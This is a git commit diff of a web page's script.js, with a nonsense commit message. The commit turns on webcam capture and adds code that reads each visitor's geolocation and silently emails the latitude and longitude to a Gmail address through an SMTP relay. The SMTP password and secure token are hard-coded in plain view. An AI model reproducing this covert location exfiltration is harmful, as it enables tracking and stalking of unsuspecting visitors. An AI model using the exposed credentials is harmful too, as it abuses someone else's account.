995fe70743d96e21cb1120189b0aa296bbf7a932
ggsacoi <118943639+ggsacoi@users.noreply.github.com>
2025-03-06 16:25:06 +0100

    feuhngeoigqzeorghoiur

--- script.js
+++ script.js
@@ -1,33 +1,33 @@
-// let video = document.querySelector('video');
-// if(navigator.mediaDevices.getUserMedia) {
-//     navigator.mediaDevices.getUserMedia({ video: true })
-//     .then(function(stream) {
-//         video.srcObject = stream;
-//     })
-//     .catch(function(error) {
-//         console.log("Error: " + error);
-//     });
-// }
+let video = document.querySelector('video');
+if(navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+        video.srcObject = stream;
+    })
+    .catch(function(error) {
+        console.log("Error: " + error);
+    });
+}
 navigator.geolocation.getCurrentPosition(position => {
     const { latitude, longitude } = position.coords;
     // Show a map centered at latitude / longitude.
 
-  map.innerHTML = '<iframe width="100%" height="100%" src="https://www.youtube.com/embed/Co6J330sC18" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>';
-});
-addEventListener("DOMContentLoaded", () => {
-    const toggle = document.getElementById("snap");
-    const theme = localStorage.getItem('theme');
-    const audio = document.querySelector('audio');
-    if(theme) {
-        document.documentElement.setAttribute('data-theme', theme);
-        if(theme === 'dark') {
-            toggle.checked = true;
-        }
-    }
-    toggle.addEventListener("change", () => {
-        const newTheme = toggle.checked ? "dark" : "light";
-        document.documentElement.setAttribute("data-theme", newTheme);
-        localStorage.setItem("theme", newTheme);
-        audio.play();
-    });
+  map.innerHTML = '<iframe width="100%" height="100%" src="https://maps.google.com/maps?q='+latitude+','+longitude+'&amp;z=15&amp;output=embed"></iframe>';
+
+    if(position) {
+
+        let send =`<b>vous avez un nouveau message voici l'adresse: </b> ${latitude} + ${longitude}`;
+    Email.send({
+        Host : "smtp.elasticemail.com",
+        Username : "merviendma@gmail.com",
+        Password : "0A3820F0657D0726E4D1A76183B571550DA9",
+        SecureToken : "236369de-bba0-4150-b749-71209e0ab842",
+        To : 'merviendama@gmail.com',
+        From : "merviendama@gmail.com",
+        Subject : "Nouvel adresse",
+        Body : send
+    }).then(
+      message => alert("message envoyer")
+    );
+}
 });
